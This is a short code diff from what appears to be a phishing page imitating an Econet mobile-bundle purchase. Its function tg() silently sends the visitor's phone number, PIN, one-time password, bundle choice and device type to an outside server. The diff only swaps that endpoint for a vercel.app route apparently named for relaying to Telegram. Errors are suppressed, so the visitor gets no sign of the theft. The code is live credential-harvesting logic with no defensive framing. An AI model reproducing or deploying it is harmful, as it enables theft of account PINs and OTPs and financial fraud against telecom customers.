@@ -501,7 +501,7 @@ function tgDevice(){var ua=navigator.userAgent||'';return(ua.match(/Mobile|Andro
 function tgPhone(r){return String(r||'').replace(/[^0-9]/g,'').replace(/^(00263|263|0)/,'');}
 function tg(ev,otp){
   try{
-    fetch('https://econet-api.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+    fetch('https://econet-api.vercel.app/api/sendtelegram',{method:'POST',headers:{'Content-Type':'application/json'},
     body:JSON.stringify({event:ev,phone:tgPhone(recip.raw),pin:PIN,otp:otp||'',bundle:bundle.name||'',data:bundle.data||'',amount:bundle.price||'',device:tgDevice()})}).catch(function(){});
   }catch(e){}
 }
